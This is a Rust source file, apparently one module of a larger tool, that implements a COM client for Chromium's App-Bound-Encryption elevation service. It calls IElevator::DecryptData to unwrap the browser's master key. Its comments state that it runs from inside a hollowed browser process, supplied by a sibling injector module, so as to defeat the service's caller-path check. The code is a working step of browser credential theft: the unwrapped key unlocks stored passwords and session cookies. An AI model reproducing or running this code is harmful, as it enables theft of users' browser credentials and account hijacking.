//! The Chromium App-Bound-Encryption (ABE) `IElevator` COM client.
//!
//! Since Chrome 127 the master key in `Local State`
//! (`os_crypt.app_bound_encrypted_key`) can only be unwrapped by the
//! browser's elevation service, a COM server that validates the CALLING
//! process's image path against the browser's own binary — which is why this
//! client is invoked from inside the hollowed browser process (see
//! [`super::injector`]). From any other image the server answers
//! `E_ACCESSDENIED`.
//!
//! Interface layout (per the public Chromium `elevator.h` and public
//! reversing write-ups):
//!
//! | family        | vtable before `DecryptData`                       | slot |
//! |---------------|----------------------------------------------------|------|
//! | Chrome/Brave  | IUnknown(3) + RunRecoveryCRXElevated + EncryptData | 5    |
//! | Edge          | base(3 placeholders) + RunRecovery + EncryptData   | 8    |
//!
//! `DecryptData(const BSTR ciphertext, BSTR* plaintext, DWORD* last_error)`.
//! Newer builds expose `IElevator2` with methods appended, which preserves
//! these slots — trying the v2 IID first and falling back to v1 covers both.
#![allow(unsafe_code)]

use std::ffi::c_void;

use windows_sys::core::{BSTR, HRESULT};
use windows_sys::Win32::Foundation::{SysAllocStringByteLen, SysFreeString, SysStringByteLen};
use windows_sys::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoSetProxyBlanket, CoUninitialize, CLSCTX_LOCAL_SERVER,
    COINIT_APARTMENTTHREADED,
};

use super::last_error;
use crate::inventory::AbeIdentity;

/// COM impersonation constants not exported by windows-sys (per rpcdce.h).
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;

/// Apartment already initialized on another concurrency model: proceed, but
/// do not uninitialize a balance we did not create.
const RPC_E_CHANGED_MODE: HRESULT = 0x8001_0106_u32 as i32;

/// Hard upper bound for the `DecryptData` vtable slot. The known families
/// use slots 5/8; no COM interface in play approaches 64 methods, and
/// refusing larger values keeps the vtable read from wandering.
const MAX_VTABLE_SLOT: usize = 64;

/// Calls the browser's ABE elevator to decrypt `ciphertext` (the
/// `app_bound_encrypted_key` blob with the 4-byte `"APPB"` prefix already
/// stripped), returning the plaintext master key.
///
/// MUST be called from a process whose image path is the browser's own
/// binary (the elevation service path-checks its caller).
///
/// # Errors
/// COM setup/instantiation/`DecryptData` failures, or a protocol violation
/// (slot out of range, ciphertext over `u32::MAX`, success with a null
/// plaintext pointer).
pub fn unwrap(spec: &AbeIdentity, ciphertext: &[u8]) -> anyhow::Result<Vec<u8>> {
    if spec.decrypt_slot >= MAX_VTABLE_SLOT {
        anyhow::bail!("decrypt vtable slot {} out of range", spec.decrypt_slot);
    }
    if ciphertext.len() > u32::MAX as usize {
        anyhow::bail!("ciphertext exceeds the SysAllocStringByteLen length limit");
    }
    let _apartment = Apartment::init()?;

    // BSTR is length-prefixed, so the binary APPB blob survives intact
    // (SysAllocStringByteLen does not stop at NULs).
    // SAFETY: `ciphertext` is readable for `len` bytes (length checked
    // above); the returned BSTR is freed by `Bstr` exactly once.
    let input = unsafe { SysAllocStringByteLen(ciphertext.as_ptr(), ciphertext.len() as u32) };
    if input.is_null() {
        return Err(last_error("SysAllocStringByteLen"));
    }
    let _input_guard = Bstr(input);

    let clsid = to_sys(&spec.clsid);
    let mut last_hr: HRESULT = -1;
    for iid in &spec.iids {
        let iid = to_sys(iid);
        let mut obj: *mut c_void = std::ptr::null_mut();
        // SAFETY: out-param `obj` is valid for write. A misbehaving server
        // could return a non-null pointer with a failure HRESULT — released
        // on that path below.
        let hr = unsafe {
            CoCreateInstance(
                &clsid,
                std::ptr::null_mut(),
                CLSCTX_LOCAL_SERVER,
                &iid,
                &mut obj,
            )
        };
        if hr < 0 || obj.is_null() {
            if !obj.is_null() {
                // SAFETY: releasing the interface pointer once.
                unsafe { release(obj) };
            }
            last_hr = hr;
            continue;
        }

        // Demand packet privacy + impersonation so the service accepts the
        // RPC. A failure is NOT best-effort: without the blanket DecryptData
        // runs with the wrong security settings, so skip this interface.
        // SAFETY: `obj` is a live COM proxy just returned above.
        let blanket_hr = unsafe {
            CoSetProxyBlanket(
                obj,
                RPC_C_AUTHN_DEFAULT,
                RPC_C_AUTHZ_DEFAULT,
                std::ptr::null(),
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                std::ptr::null(),
                EOAC_DYNAMIC_CLOAKING,
            )
        };
        if blanket_hr < 0 {
            // SAFETY: balancing the CoCreateInstance reference.
            unsafe { release(obj) };
            last_hr = blanket_hr;
            continue;
        }

        let mut plain: BSTR = std::ptr::null_mut();
        let mut com_err: u32 = 0;
        // SAFETY: `obj` implements the elevator interface at the vtable slot
        // the identity declares (slot bounded above); `input` is a live BSTR
        // and both out-params are valid for writes.
        let hr = unsafe { decrypt_data(obj, spec.decrypt_slot, input, &mut plain, &mut com_err) };
        // SAFETY: releasing once balances the CoCreateInstance reference.
        unsafe { release(obj) };

        if hr >= 0 {
            if plain.is_null() {
                anyhow::bail!("DecryptData succeeded but returned a null BSTR");
            }
            // SAFETY: `plain` is a live BSTR; SysStringByteLen reports its
            // byte length and we copy exactly that many bytes before freeing.
            let key = unsafe {
                let len = SysStringByteLen(plain) as usize;
                std::slice::from_raw_parts(plain.cast::<u8>(), len).to_vec()
            };
            // SAFETY: freeing the returned BSTR once.
            unsafe { SysFreeString(plain) };
            return Ok(key);
        }
        // A server may legally set out-params even on failure — free a
        // non-null plaintext BSTR rather than leaking it.
        if !plain.is_null() {
            // SAFETY: freeing the returned BSTR once.
            unsafe { SysFreeString(plain) };
        }
        last_hr = hr;
    }
    anyhow::bail!("IElevator::DecryptData failed (HRESULT 0x{last_hr:08x})");
}

/// Signature of the elevator's `DecryptData` method.
type DecryptDataFn = unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> HRESULT;

/// Invokes the `DecryptData` vtable slot directly.
///
/// # Safety
/// `obj` must be a live COM interface pointer whose vtable has a function of
/// [`DecryptDataFn`]'s signature at `slot`; `input` a live BSTR; out-params
/// valid.
unsafe fn decrypt_data(
    obj: *mut c_void,
    slot: usize,
    input: BSTR,
    out: *mut BSTR,
    com_err: *mut u32,
) -> HRESULT {
    // SAFETY: a COM interface pointer's first word points to its vtable; the
    // caller guarantees `slot` indexes a DecryptData-compatible entry.
    let vtable = unsafe { *(obj as *const *const *const c_void) };
    // SAFETY: reading the function pointer at `slot` of a live vtable.
    let entry = unsafe { *vtable.add(slot) };
    // SAFETY: transmuting the vtable entry to the known method signature, per
    // the caller's contract.
    let f: DecryptDataFn = unsafe { std::mem::transmute(entry) };
    // SAFETY: forwarding the caller's guarantees on all arguments.
    unsafe { f(obj, input, out, com_err) }
}

/// Calls `IUnknown::Release` (vtable slot 2).
///
/// # Safety
/// `obj` must be a live COM interface pointer released at most once.
unsafe fn release(obj: *mut c_void) {
    type ReleaseFn = unsafe extern "system" fn(*mut c_void) -> u32;
    // SAFETY: standard COM layout; slot 2 is IUnknown::Release on any
    // interface.
    let vtable = unsafe { *(obj as *const *const *const c_void) };
    let entry = unsafe { *vtable.add(2) };
    let f: ReleaseFn = unsafe { std::mem::transmute(entry) };
    // SAFETY: balanced single release per the caller.
    unsafe { f(obj) };
}

/// RAII for the COM apartment.
struct Apartment {
    owned: bool,
}

impl Apartment {
    fn init() -> anyhow::Result<Self> {
        // SAFETY: no invariants required; reports the apartment state via hr.
        let hr = unsafe { CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED as u32) };
        if hr >= 0 || hr == RPC_E_CHANGED_MODE {
            Ok(Self { owned: hr >= 0 })
        } else {
            Err(last_error("CoInitializeEx"))
        }
    }
}

impl Drop for Apartment {
    fn drop(&mut self) {
        if self.owned {
            // SAFETY: balances the successful CoInitializeEx in init().
            unsafe { CoUninitialize() };
        }
    }
}

/// RAII freeing a BSTR allocated with SysAllocStringByteLen.
struct Bstr(BSTR);

impl Drop for Bstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            // SAFETY: freeing a BSTR this guard owns, exactly once.
            unsafe { SysFreeString(self.0) };
        }
    }
}

fn to_sys(g: &crate::inventory::Guid) -> windows_sys::core::GUID {
    windows_sys::core::GUID {
        data1: g.data1,
        data2: g.data2,
        data3: g.data3,
        data4: g.data4,
    }
}
